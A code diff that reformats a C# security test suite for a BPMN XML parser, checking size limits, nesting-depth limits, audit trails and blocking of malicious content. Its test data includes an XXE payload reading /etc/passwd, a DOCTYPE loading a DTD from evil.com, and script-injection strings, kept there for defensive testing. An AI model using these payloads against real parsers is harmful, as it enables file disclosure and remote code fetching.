@@ -11,35 +11,29 @@ namespace VertexBPMN.Tests.Parsing.Hardening;
 /// </summary>
 public class EnhancedSecurityTests
 {
-    private readonly ITestOutputHelper _output;
 
-    public EnhancedSecurityTests(ITestOutputHelper output)
-    {
-        _output = output;
-    }
+	[Fact]
+	public async Task ResourceLimiter_BlocksOversizedInput()
+	{
+		var options = new BpmnParserOptions
+		{
+			SecurityOptions = new BpmnSecurityOptions { MaxXmlSizeBytes = 1000 }
+		};
 
-    [Fact]
-    public async Task ResourceLimiter_BlocksOversizedInput()
-    {
-        var options = new BpmnParserOptions
-        {
-            SecurityOptions = new BpmnSecurityOptions { MaxXmlSizeBytes = 1000 }
-        };
-        
-        var parser = new BpmnParser(options);
-        var oversizedXml = new string('X', 2000) + "<definitions><process/></definitions>";
+		var parser = new BpmnParser(options);
+		var oversizedXml = new string('X', 2000) + "<definitions><process/></definitions>";
 
-        var ex = await Assert.ThrowsAsync<SecurityException>(
-            () => parser.ParseAsync(oversizedXml, TestContext.Current.CancellationToken));
-        
-        Assert.Contains("exceeds limit", ex.Message);
-    }
+		var ex = await Assert.ThrowsAsync<SecurityException>(
+			() => parser.ParseAsync(oversizedXml, TestContext.Current.CancellationToken));
 
-    [Fact]
-    public async Task ContentValidator_DetectsMaliciousScript()
-    {
-        var validator = new BpmnContentValidator();
-        var maliciousXml = """
+		Assert.Contains("exceeds limit", ex.Message, StringComparison.Ordinal);
+	}
+
+	[Fact]
+	public async Task ContentValidator_DetectsMaliciousScript()
+	{
+		var validator = new BpmnContentValidator();
+		const string maliciousXml = """
 <definitions>
   <process>
     <task name="&lt;script&gt;alert('XSS')&lt;/script&gt;"/>
@@ -47,17 +41,17 @@ public class EnhancedSecurityTests
 </definitions>
 """;
 
-        var result = validator.ValidateContent(maliciousXml);
-        
-        Assert.False(result.IsSecure);
-        Assert.Contains(result.Threats, t => t.Type == ThreatType.MaliciousContent);
-    }
+		var result = validator.ValidateContent(maliciousXml);
 
-    [Fact]
-    public void ContentValidator_AllowsBpmnScriptTask()
-    {
-        var validator = new BpmnContentValidator();
-        var bpmnXml = """
+		Assert.False(result.IsSecure);
+		Assert.Contains(result.Threats, t => t.Type == ThreatType.MaliciousContent);
+	}
+
+	[Fact]
+	public void ContentValidator_AllowsBpmnScriptTask()
+	{
+		var validator = new BpmnContentValidator();
+		const string bpmnXml = """
 <definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL">
   <process id="process">
     <scriptTask id="scriptTask" scriptFormat="javascript">
@@ -67,16 +61,16 @@ public class EnhancedSecurityTests
 </definitions>
 """;
 
-        var result = validator.ValidateContent(bpmnXml);
+		var result = validator.ValidateContent(bpmnXml);
 
-        Assert.True(result.IsSecure);
-    }
+		Assert.True(result.IsSecure);
+	}
 
-    [Fact]
-    public void ContentValidator_AllowsUnusedForeignNamespaceDeclarations()
-    {
-        var validator = new BpmnContentValidator();
-        var bpmnXml = """
+	[Fact]
+	public void ContentValidator_AllowsUnusedForeignNamespaceDeclarations()
+	{
+		var validator = new BpmnContentValidator();
+		const string bpmnXml = """
 <definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
              xmlns:svg="http://www.w3.org/2000/svg"
              xmlns:xhtml="http://www.w3.org/1999/xhtml">
@@ -84,16 +78,16 @@ public class EnhancedSecurityTests
 </definitions>
 """;
 
-        var result = validator.ValidateContent(bpmnXml);
+		var result = validator.ValidateContent(bpmnXml);
 
-        Assert.True(result.IsSecure);
-    }
+		Assert.True(result.IsSecure);
+	}
 
-    [Fact]
-    public void ContentValidator_BlocksScriptOutsideBpmnNamespace()
-    {
-        var validator = new BpmnContentValidator();
-        var maliciousXml = """
+	[Fact]
+	public void ContentValidator_BlocksScriptOutsideBpmnNamespace()
+	{
+		var validator = new BpmnContentValidator();
+		const string maliciousXml = """
 <definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
              xmlns:xhtml="http://www.w3.org/1999/xhtml">
   <process id="process">
@@ -102,71 +96,71 @@ public class EnhancedSecurityTests
 </definitions>
 """;
 
-        var result = validator.ValidateContent(maliciousXml);
+		var result = validator.ValidateContent(maliciousXml);
 
-        Assert.False(result.IsSecure);
-        Assert.Contains(result.Threats, t => t.Type == ThreatType.MaliciousContent);
-    }
+		Assert.False(result.IsSecure);
+		Assert.Contains(result.Threats, t => t.Type == ThreatType.MaliciousContent);
+	}
 
-    [Fact]
-    public void SecurityValidator_GeneratesAuditTrail()
-    {
-        var validator = new BpmnSecurityValidator();
-        var testXml = "<definitions><process id='test'/></definitions>";
+	[Fact]
+	public void SecurityValidator_GeneratesAuditTrail()
+	{
+		var validator = new BpmnSecurityValidator();
+		const string testXml = "<definitions><process id='test'/></definitions>";
 
-        var result = validator.ValidateSecurityConfiguration(testXml);
-        
-        Assert.NotNull(result.SecurityHash);
-        Assert.True(result.ValidationTimestamp > DateTimeOffset.MinValue);
-    }
+		var result = validator.ValidateSecurityConfiguration(testXml);
 
-    [Theory]
-    [InlineData("<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>")]
-    [InlineData("<?xml version='1.0'?><!DOCTYPE root SYSTEM 'http://evil.com/malicious.dtd'><root/>")]
-    [InlineData("<root xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script></root>")]
-    public async Task SecurityValidation_BlocksKnownAttackVectors(string maliciousXml)
-    {
-        var parser = new BpmnParser(new BpmnParserOptions
-        {
-            EnableSecurityValidation = true,
-            FailOnSecurityThreat = true
-        });
+		Assert.NotNull(result.SecurityHash);
+		Assert.True(result.ValidationTimestamp > DateTimeOffset.MinValue);
+	}
 
-        await Assert.ThrowsAnyAsync<Exception>(() => parser.ParseAsync(maliciousXml, TestContext.Current.CancellationToken));
-    }
+	[Theory]
+	[InlineData("<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>")]
+	[InlineData("<?xml version='1.0'?><!DOCTYPE root SYSTEM 'http://evil.com/malicious.dtd'><root/>")]
+	[InlineData("<root xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script></root>")]
+	public async Task SecurityValidation_BlocksKnownAttackVectors(string maliciousXml)
+	{
+		var parser = new BpmnParser(new BpmnParserOptions
+		{
+			EnableSecurityValidation = true,
+			FailOnSecurityThreat = true
+		});
 
-    [Fact]
-    public async Task ParsingLimits_PreventDeepNestingDoSAttacks()
-    {
-        var options = new BpmnParserOptions
-        {
-            SecurityOptions = new BpmnSecurityOptions { ParseTimeout = TimeSpan.FromMilliseconds(100) }
-        };
-        
-        var parser = new BpmnParser(options);
-        
-        // Create deeply nested XML that would take long to parse
-        var deepXml = GenerateDeeplyNestedXml(1000);
+		await Assert.ThrowsAnyAsync<Exception>(() => parser.ParseAsync(maliciousXml, TestContext.Current.CancellationToken));
+	}
 
-        var ex = await Assert.ThrowsAsync<SecurityException>(
-            () => parser.ParseAsync(deepXml, TestContext.Current.CancellationToken));
-        
-        Assert.Contains("nesting depth", ex.Message, StringComparison.OrdinalIgnoreCase);
-    }
+	[Fact]
+	public async Task ParsingLimits_PreventDeepNestingDoSAttacks()
+	{
+		var options = new BpmnParserOptions
+		{
+			SecurityOptions = new BpmnSecurityOptions { ParseTimeout = TimeSpan.FromMilliseconds(100) }
+		};
 
-    private static string GenerateDeeplyNestedXml(int depth)
-    {
-        var xml = "<definitions>";
-        for (int i = 0; i < depth; i++)
-        {
-            xml += $"<element{i}>";
-        }
-        xml += "<process/>";
-        for (int i = depth - 1; i >= 0; i--)
-        {
-            xml += $"</element{i}>";
-        }
-        xml += "</definitions>";
-        return xml;
-    }
+		var parser = new BpmnParser(options);
+
+		// Create deeply nested XML that would take long to parse
+		var deepXml = GenerateDeeplyNestedXml(1000);
+
+		var ex = await Assert.ThrowsAsync<SecurityException>(
+			() => parser.ParseAsync(deepXml, TestContext.Current.CancellationToken));
+
+		Assert.Contains("nesting depth", ex.Message, StringComparison.OrdinalIgnoreCase);
+	}
+
+	private static string GenerateDeeplyNestedXml(int depth)
+	{
+		var xml = "<definitions>";
+		for (var i = 0; i < depth; i++)
+		{
+			xml += $"<element{i}>";
+		}
+		xml += "<process/>";
+		for (var i = depth - 1; i >= 0; i--)
+		{
+			xml += $"</element{i}>";
+		}
+		xml += "</definitions>";
+		return xml;
+	}
 }
